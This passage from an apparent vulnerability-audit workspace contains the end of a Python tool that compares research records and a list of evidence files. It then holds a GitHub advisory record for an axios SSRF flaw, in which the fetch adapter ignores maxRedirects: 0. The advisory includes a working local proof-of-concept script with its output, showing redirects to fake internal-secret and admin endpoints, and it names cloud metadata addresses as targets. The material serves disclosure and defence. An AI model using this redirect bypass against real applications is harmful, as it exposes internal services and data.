res\"),\n    (\"decomposition_probe\", \"AGGREGATE_MEMBERS_UNREACHABLE requires\"),\n    (\"non_git_boundary\", \"NON_GIT_BOUNDARY requires\"),\n    (\"flip_condition\", \"requires flip_condition\"),\n    (\"fix_ai_marker\", \"fix_ai_marker.state\"),\n    (\"ai_on_bic_type\", \"ai_on_bic must be a JSON boolean\"),\n    (\"ai_verdict_marker\", \"needs ai_on_bic true\"),\n    (\"not_ai_vs_ai_on_bic\", \"NOT_AI contradicts\"),\n)\nGIT_ENV = {**os.environ, \"GIT_NO_LAZY_FETCH\": \"1\"}\n\n# Text differences are review obligations, not machine-decided contradictions.\n# Keep distinct roles distinct: a landing is not an atomic member, and a later\n# AI contribution is not a decomposed BIC member.\nRESEARCH_FIELDS = {\n    'advisory': ('verdict', 'advisory_ids', 'advisory_disposition',\n                 'advisory_aliases', 'false_positive_ground'),\n    'mechanism': ('cause', 'mechanism', 'mechanisms', 'bug_semantics',\n                  'flaw_origin', 'counterevidence', 'evidence', 'reasoning'),\n    'bic': ('introducer_sha', 'introducer_parent', 'bic_granularity',\n            'bic_minimality', 'bic_note', 'landing_commit', 'landing_basis',\n            'landing_note', 'decomposed_shas', 'decomposition_probe'),\n    'ai': ('ai_on_bic', 'ai_marker', 'ai_admissibility', 'identity_class',\n           'disclosure_convention', 'disclosure_convention_evidence',\n           'candidate_set', 'candidate_details', 'carrier_set', 'ai_evidence'),\n    'fix': ('fix_sha', 'direct_fix_sha', 'atomic_repair_sha', 'fix_shas',\n            'minimum_fix_set', 'fix_granularity', 'fix', 'fix_note',\n            'fix_ai_marker', 'fix_chain', 'ir_chain', 'unpatched', 'potential_fix'),\n    'versions': ('versions', 'affected_versions', 'fixed_versions',\n                 'fixed_release', 'clone_head_sha'),\n    'residual': ('remaining_gap', 'residual_triage', 'flip_condition'),\n}\n\n\ndef research_differences_many(records: dict[str, dict]) -> dict:\n    \"\"\"List differing claims from every lane without choosing a preferred report.\"\"\"\n    first = next(iter(records.values()))\n    return {\n        dimension: {field: {name: record.get(field) for name, record in records.items()}\n                    for field in fields\n                    if any(record.get(field) != first.get(field) for record in records.values())}\n        for dimension, fields in RESEARCH_FIELDS.items()\n        if any(record.get(field) != first.get(field)\n               for field in fields for record in records.values())\n    }\n\n\ndef research_differences(a: dict, b: dict) -> dict:\n    return research_differences_many({'a': a, 'b': b})\n\n\ndef lane_paths(values=None, a: Path | None = None, b: Path | None = None) -> dict[str, Path]:\n    if values:\n        if a is not None or b is not None:\n            raise ValueError('use --lane or --a/--b, not both')\n        paths = {}\n        for value in values:\n            name, separator, path = value.partition('=')\n            if not separator or not path or not re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9_-]*', name):\n                raise ValueError('--lane requires NAME=PATH')\n            if name == 'accepted' or name in paths:\n                raise ValueError(f'duplicate or reserved lane name: {name}')\n            paths[name] = Path(path)\n    elif a is not None and b is not None:\n        paths = {'a': a, 'b': b}\n    else:\n        raise ValueError('supply named --lane inputs, or both --a and --b')\n    if len({path.resolve() for path in paths.values()}) != len(paths):\n        raise ValueError('independent lanes must have distinct input paths')\n    return paths\n\nsealed-auditors/auditor1/evidence/carriers.py\nsealed-auditors/auditor1/evidence/validate_delivery.py\nsealed-auditors/auditor1/evidence/npm-tar-1.20.0.headers\nsealed-auditors/auditor1/evidence/npm-tar-1.20.0.receipt.json\nsealed-auditors/auditor1/evidence/npm-tar-1.19.0.receipt.json\nsealed-auditors/auditor1/evidence/inspect_packages.py\nsealed-auditors/auditor1/evidence/npm-tar-1.19.0.raw\nsealed-auditors/auditor1/evidence/npm-tar-1.20.0.raw\nsealed-auditors/auditor1/evidence/npm-tar-1.20.0.stderr\nsealed-auditors/auditor1/evidence/deliver.py\nsealed-auditors/auditor1/evidence/npm-tar-1.19.0.stderr\nsealed-auditors/auditor1/evidence/npm-tar-1.19.0.headers\nsealed-auditors/auditor1/evidence/research_tools.py\n{\n  \"ghsa_id\": \"GHSA-r4gj-5m52-g5wh\",\n  \"cve_id\": \"CVE-2026-101907\",\n  \"url\": \"https://api.github.com/advisories/GHSA-r4gj-5m52-g5wh\",\n  \"html_url\": \"https://github.com/advisories/GHSA-r4gj-5m52-g5wh\",\n  \"summary\": \"Axios: maxRedirects: 0 is not enforced by the fetch adapter, allowing redirect-based SSRF\",\n  \"description\": \"## Summary\\n\\nAxios exposes `maxRedirects` to limit redirect following, and `maxRedirects: 0` is used by applications as a redirect-based SSRF guard. The Node HTTP adapter enforces this option. The fetch adapter does not read it and does not set a Fetch API `redirect` mode, so the runtime default of `redirect: 'follow'` applies.\\n\\nApplications are affected when they rely on `maxRedirects: 0` and use the fetch adapter, either explicitly or because the runtime selects it.\\n\\n## Impact\\n\\nAn attacker who controls the initial URL or a redirecting server can cause a fetch-adapter request to follow a redirect even though the caller configured `maxRedirects: 0`. If the redirect target is reachable only from the application environment, this can expose internal responses or trigger state-changing internal endpoints.\\n\\nThis should not be described as unconditional SSRF. The bypass requires a redirect source, such as an attacker-controlled server or open redirect, and an application that trusted `maxRedirects: 0` as the redirect guard.\\n\\n## Affected Functionality\\n\\nAffected:\\n\\n- `adapter: 'fetch'`.\\n- Runtime environments where fetch is selected by adapter resolution.\\n- Requests configured with `maxRedirects: 0` but without `fetchOptions.redirect: 'manual'` or equivalent runtime-specific redirect control.\\n\\nNot affected:\\n\\n- Node HTTP adapter, which enforces `maxRedirects: 0`.\\n- Requests that do not follow redirects in the underlying fetch implementation because the caller explicitly configured fetch redirect behavior.\\n\\n## Technical Details\\n\\n`lib/adapters/fetch.js` destructures many fields from `resolveConfig(config)`, but not `maxRedirects`. It then builds fetch options without a `redirect` key:\\n\\n```js\\nconst resolvedOptions = {\\n  ...fetchOptions,\\n  signal: composedSignal,\\n  method: method.toUpperCase(),\\n  headers: toByteStringHeaderObject(headers.normalize()),\\n  body: data,\\n  duplex: 'half',\\n  credentials: isCredentialsSupported ? withCredentials : undefined,\\n};\\n```\\n\\nBecause `redirect` is absent, the Fetch API default is to follow redirects.\\n\\nLocal verification on axios `1.18.1` showed the HTTP adapter throwing with `maxRedirects: 0`, while the fetch adapter followed the same loopback `302` and returned the internal response.\\n\\n## Proof of Concept of Attack\\n\\nConstrained local demonstration:\\n\\n1. Start server A that returns `302 Location: http://127.0.0.1:<server-b>/internal`.\\n2. Start server B that returns `INTERNAL`.\\n3. Compare:\\n\\n```js\\nawait axios.get(serverA, { adapter: 'http', maxRedirects: 0 });  // throws\\nawait axios.get(serverA, { adapter: 'fetch', maxRedirects: 0 }); // returns INTERNAL\\n```\\n\\n## Workarounds\\n\\nFor fetch-adapter requests, set `fetchOptions: { redirect: 'manual' }` where the runtime supports it, or use the Node HTTP adapter for requests that rely on axios redirect limits.\\n\\n<details>\\n  <summary><h3>Original report</h3></summary>\\n  \\n## Summary\\n\\nAxios 1.17.0 exposes `maxRedirects` as a configuration option to limit redirect following, and setting it to `0` is a documented pattern for preventing redirect-based SSRF. The HTTP adapter enforces this via `follow-redirects`. The fetch adapter does not read `maxRedirects` at all - it passes requests to the underlying `fetch()` call with no `redirect` option, which defaults to `'follow'`, so redirects are followed by the runtime rather than being constrained by axios `maxRedirects`.\\n\\nIn the attached PoC, a request issued with `maxRedirects: 0` and `adapter: 'fetch'` follows a `302` redirect to an internal service and returns its response, while the same request with `adapter: 'http'` correctly throws. A second bypass case demonstrates that the redirect can reach a state-changing internal endpoint, not just read-only ones, proving both confidentiality and integrity impact.\\n\\nThis affects any application that sets `maxRedirects: 0` as a redirect guard and runs in an environment where the fetch adapter is active: Deno, Bun, Cloudflare Workers, or Node.js with `adapter: 'fetch'` set explicitly.\\n\\n## Details\\n\\nThe fetch adapter destructures config fields from `resolveConfig` at `lib/adapters/fetch.js`:\\n\\n```js\\nlet {\\n  url, method, data, signal, cancelToken, timeout,\\n  onDownloadProgress, onUploadProgress, responseType,\\n  headers, withCredentials, fetchOptions,\\n  maxContentLength, maxBodyLength,\\n} = resolveConfig(config);\\n// maxRedirects is not extracted\\n```\\n\\nThe options object passed to `fetch()` has no `redirect` key:\\n\\n```js\\nconst resolvedOptions = {\\n  ...fetchOptions,       // redirect only set here if caller explicitly passes fetchOptions.redirect\\n  signal: composedSignal,\\n  method: method.toUpperCase(),\\n  headers: toByteStringHeaderObject(headers.normalize()),\\n  body: data,\\n  duplex: 'half',\\n  credentials: isCredentialsSupported ? withCredentials : undefined,\\n};\\n```\\n\\nBecause no `redirect` key is present, the Fetch API default of `redirect: 'follow'` applies, so redirects are handled by the runtime rather than constrained by axios `maxRedirects`. The HTTP adapter, by contrast, delegates to `follow-redirects`, which reads `maxRedirects`, enforces the cap, and strips `Authorization`, `Cookie`, and `Proxy-Authorization` on cross-origin redirects.\\n\\nThe discrepancy between adapters is not documented. The threat model covers credential stripping on redirects (T-R2) and cites `follow-redirects` as the mitigation, but makes no mention that the fetch adapter does not participate in this mitigation. See: https://github.com/axios/axios/blob/master/THREATMODEL.md#t-r2-credential-leakage-on-cross-origin-redirect\\n\\nThe behaviour difference between adapters is summarised below:\\n\\n| Behaviour                              | HTTP adapter                    | Fetch adapter            |\\n|----------------------------------------|---------------------------------|--------------------------|\\n| Reads `config.maxRedirects`            | Yes                             | **No**                   |\\n| Enforces `maxRedirects: 0`             | Yes -- throws on any redirect   | **No -- follows silently**|\\n| Strips `Authorization` cross-origin    | Yes (`follow-redirects` >=1.15.8)| Runtime-dependent       |\\n| Strips `Cookie` cross-origin           | Yes                             | Runtime-dependent        |\\n\\n### When is the fetch adapter selected?\\n\\n- **Deno, Bun, Cloudflare Workers:** no Node.js `http` module available; the adapter list falls through to `'fetch'`\\n- **Explicit config:** `axios.get(url, { adapter: 'fetch' })`\\n- **Custom adapter list:** `axios.create({ adapter: ['fetch'] })`\\n\\n## PoC\\n\\n```js\\nimport http from 'http';\\nimport axios from './index.js';\\n\\n// Server A: the \\\"trusted\\\" external target, issues open redirects to Server B\\nconst serverA = http.createServer((req, res) => {\\n  if (req.url === '/api/data') {\\n    res.writeHead(302, { Location: 'http://127.0.0.1:13802/internal/secrets' });\\n    return res.end();\\n  }\\n  if (req.url === '/api/change-config') {\\n    res.writeHead(302, { Location: 'http://127.0.0.1:13802/internal/admin/config' });\\n    return res.end();\\n  }\\n  res.writeHead(200, { 'Content-Type': 'application/json' });\\n  res.end(JSON.stringify({ ok: true }));\\n});\\n\\nlet internalHits = 0;\\nlet internalConfig = {};\\n\\n// Server B: the \\\"internal\\\" service, should be unreachable from the application\\nconst serverB = http.createServer(async (req, res) => {\\n  internalHits++;\\n\\n  if (req.url === '/internal/secrets') {\\n    res.writeHead(200, { 'Content-Type': 'application/json' });\\n    return res.end(JSON.stringify({\\n      secret: 'FAKE_AWS_SECRET_ACCESS_KEY_FOR_POC_ONLY',\\n      role:   'arn:aws:iam::000000000000:role/FakeProductionRole',\\n    }));\\n  }\\n\\n  if (req.url === '/internal/admin/config') {\\n    internalConfig = { compromised: true, source: 'redirect-followed-by-fetch-adapter' };\\n    res.writeHead(200, { 'Content-Type': 'application/json' });\\n    return res.end(JSON.stringify({\\n      reached: 'state-changing internal admin endpoint',\\n      changed: true,\\n      internalConfig,\\n    }));\\n  }\\n\\n  res.writeHead(404);\\n  res.end();\\n});\\n\\nawait Promise.all([\\n  new Promise((resolve, reject) => { serverA.listen(13801, '127.0.0.1', resolve); serverA.on('error', reject); }),\\n  new Promise((resolve, reject) => { serverB.listen(13802, '127.0.0.1', resolve); serverB.on('error', reject); }),\\n]);\\n\\nconst targetUrl    = 'http://127.0.0.1:13801/api/data';\\nconst changeUrl    = 'http://127.0.0.1:13801/api/change-config';\\nconst internalUrl  = 'http://127.0.0.1:13802/internal/secrets';\\nconst internalCfg  = 'http://127.0.0.1:13802/internal/admin/config';\\n\\nconsole.log('Axios maxRedirects bypass via fetch adapter PoC');\\nconsole.log(`axios VERSION=${axios.VERSION}`);\\nconsole.log(`maxRedirects=0`);\\nconsole.log(`Target URL=${targetUrl}`);\\nconsole.log(`  redirects to ${internalUrl}`);\\nconsole.log(`Change URL=${changeUrl}`);\\nconsole.log(`  redirects to ${internalCfg}`);\\nconsole.log('');\\n\\n// CONTROL: HTTP adapter correctly enforces maxRedirects: 0\\nlet httpBlocked = false;\\ntry {\\n  await axios.get(targetUrl, { maxRedirects: 0, adapter: 'http' });\\n  console.log('[CONTROL]  HTTP adapter + maxRedirects:0  BUG: should have thrown');\\n} catch (err) {\\n  httpBlocked = true;\\n  console.log(`[CONTROL]  HTTP adapter + maxRedirects:0  correctly blocked redirect ✓ (${err.code ?? err.message})`);\\n}\\nconsole.log(`[CONTROL]  Internal hits after HTTP adapter: ${internalHits}`);\\n\\n// BYPASS: Fetch adapter silently ignores maxRedirects: 0\\nlet fetchResponse = null;\\ntry {\\n  fetchResponse = await axios.get(targetUrl, { maxRedirects: 0, adapter: 'fetch' });\\n  console.log('[BYPASS]   Fetch adapter + maxRedirects:0  SSRF succeeded ✗');\\n  console.log('           Response:', JSON.stringify(fetchResponse.data));\\n} catch (err) {\\n  console.log('[BYPASS]   Fetch adapter + maxRedirects:0  redirect blocked (unexpected):', err.message);\\n}\\nconsole.log(`[BYPASS]   Internal hits after fetch adapter: ${internalHits}`);\\n\\n// BYPASS: Fetch adapter follows redirect to state-changing internal endpoint\\nlet changedResponse = null;\\ntry {\\n  changedResponse = await axios.get(changeUrl, { maxRedirects: 0, adapter: 'fetch' });\\n  console.log('[BYPASS]   Fetch adapter state change:', JSON.stringify(changedResponse.data));\\n  console.log(`[BYPASS]   Internal hits after state change: ${internalHits}`);\\n} catch (err) {\\n  console.log('[BYPASS]   State change request blocked (unexpected):', err.message);\\n}\\n\\n\\nconsole.log('');\\n\\nif (httpBlocked && fetchResponse && changedResponse) {\\n  console.log('POC RESULT: fetch adapter followed redirects despite maxRedirects:0,');\\n  console.log('            reaching internal service and mutating internal state.');\\n} else if (httpBlocked && fetchResponse) {\\n  console.log('POC RESULT: fetch adapter followed redirect despite maxRedirects:0,');\\n  console.log('            reaching internal service that should have been unreachable.');\\n} else if (!httpBlocked) {\\n  console.log('POC RESULT: HTTP adapter did not block redirect -- unexpected, check axios version.');\\n} else {\\n  console.log('POC RESULT: fetch adapter blocked redirect -- issue may be fixed.');\\n}\\n\\nserverA.close();\\nserverB.close();\\n```\\n\\nRun:\\n\\n```bash\\nnode poc-max-redirects.mjs\\n```\\n\\nObserved:\\n\\n```text\\nAxios maxRedirects bypass via fetch adapter PoC\\naxios VERSION=1.17.0\\nmaxRedirects=0\\nTarget URL=http://127.0.0.1:13801/api/data\\n  redirects to http://127.0.0.1:13802/internal/secrets\\nChange URL=http://127.0.0.1:13801/api/change-config\\n  redirects to http://127.0.0.1:13802/internal/admin/config\\n\\n[CONTROL]  HTTP adapter + maxRedirects:0  correctly blocked redirect ✓ (ERR_BAD_RESPONSE)\\n[CONTROL]  Internal hits after HTTP adapter: 0\\n[BYPASS]   Fetch adapter + maxRedirects:0  SSRF succeeded ✗\\n           Response: {\\\"secret\\\":\\\"FAKE_AWS_SECRET_ACCESS_KEY_FOR_POC_ONLY\\\",\\\"role\\\":\\\"arn:aws:iam::000000000000:role/FakeProductionRole\\\"}\\n[BYPASS]   Internal hits after fetch adapter: 1\\n[BYPASS]   Fetch adapter state change: {\\\"reached\\\":\\\"state-changing internal admin endpoint\\\",\\\"changed\\\":true,\\\"internalConfig\\\":{\\\"compromised\\\":true,\\\"source\\\":\\\"redirect-followed-by-fetch-adapter\\\"}}\\n[BYPASS]   Internal hits after state change: 2\\n\\nPOC RESULT: fetch adapter followed redirects despite maxRedirects:0,\\n            reaching internal service and mutating internal state.\\n```\\n\\n## Control\\n\\nAxios does correctly enforce `maxRedirects: 0` in the HTTP adapter. The `[CONTROL]` case above confirms this: the same request with `adapter: 'http'` throws rather than following the redirect, and the internal hit counter stays at `0`:\\n\\n```text\\n[CONTROL]  HTTP adapter + maxRedirects:0  correctly blocked redirect ✓ (ERR_BAD_RESPONSE)\\n[CONTROL]  Internal hits after HTTP adapter: 0\\n```\\n\\nThe issue is not that `maxRedirects` is broken globally. It is enforced correctly for the HTTP adapter. The bypass is specific to the fetch adapter, which never reads the option and passes no `redirect` constraint to the underlying `fetch()` call.\\n\\n## Impact\\n\\nThis is a redirect enforcement bypass affecting axios applications running in environments where the fetch adapter is active.\\n\\nThe internal admin route in the PoC simulates an affected deployment where a redirected request can reach state-changing internal APIs. The vulnerability is that `maxRedirects: 0` is silently ignored by the fetch adapter; the exact impact depends on what redirect targets are reachable from the runtime.\\n\\nThe impact is environment- and configuration-dependent. It affects axios users who:\\n\\n- Set `maxRedirects: 0` as a defense against redirect-based SSRF, and\\n- Run in an environment where the fetch adapter is selected, either by runtime (Deno, Bun, Cloudflare Workers) or by explicit configuration\\n\\nIn these cases, a `302` redirect from the initial target is followed silently by default, unless the caller separately sets `fetchOptions.redirect`. If the redirect target is an internal service, the application returns its response to the caller with no indication that a redirect occurred or that `maxRedirects` was not honoured. The failure is silent: no error is thrown, no warning is logged.\\n\\nThe bypass is not limited to read-only access. As demonstrated by the second bypass case, a redirect to a state-changing internal endpoint succeeds equally. An attacker who can influence the redirect destination, for example through an open redirect on the initial target or a server they control, can reach internal and trigger mutations that the application never intended to issue.\\n\\nPotentially affected environments include:\\n\\n- Deno and Bun applications using axios where the fetch adapter is the default.\\n- Cloudflare Workers using axios, which has no Node.js `http` module.\\n- Node.js applications that explicitly configure `adapter: 'fetch'` or a custom adapter list that resolves to fetch.\\n- Any application that conditionally sets `maxRedirects: 0` and runs across multiple environments with different adapter selection.\\n\\nInternal services reachable via a redirect include cloud instance metadata endpoints (`169.254.169.254`), unauthenticated local services such as Redis or internal admin APIs, and other hosts accessible from the application's network that are not intended to be reachable by the caller. The hit counter in the PoC makes the access concrete: `0` after the HTTP control, `1` after the confidentiality bypass, `2` after the integrity bypass.\\n\\nThis should not be characterised as an unconditional SSRF. The bypass requires either an open redirect on the initial target, or a URL that is itself a redirect. The issue is that `maxRedirects: 0`, which is the intended mitigation for this class of attack, is silently non-functional in the fetch adapter, leaving applications with a false sense of protection.\\n</details>\\n\\n---\",\n  \"type\": \"reviewed\",\n  \"severity\": \"high\",\n  \"repository_advisory_url\": \"https://api.github.com/repos/axios/axios/security-advisories/GHSA-r4gj-5m52-g5wh\",\n  \"source_code_location\": \"https://github.com/axios/axios\",\n  \"identifiers\": [\n    {\n      \"value\": \"GHSA-r4gj-5m52-g5wh\",\n      \"type\": \"GHSA\"\n    },\n    {\n      \"value\": \"CVE-2026-101907\",\n      \"type\": \"CVE\"\n    }\n  ],\n  \"references\": [\n    \"https://github.com/axios/axios/security/advisories/GHSA-r4gj-5m52-g5wh\",\n    \"https://nvd.nist.gov/vuln/detail/CVE-2026-101907\",\n    \"https://github.com/axios/axios/pull/11141\",\n    \"https://github.com/axios/axios/commit/d19040bda7a8be2f82c3c6e1a5bc03917daee39a\",\n    \"https://github.com/axios/axios/releases/tag/v1.20.0\",\n    \"https://github.com/advisories/GHSA-r4gj-5m52-g5wh\"\n  ],\n  \"published_at\": \"2026-09-30T15:31:58Z\",\n  \"updated_at\": \"2026-09-30T15:32:00Z\",\n  \"github_reviewed_at\": \"2026-09-30T15:31:58Z\",\n  \"nvd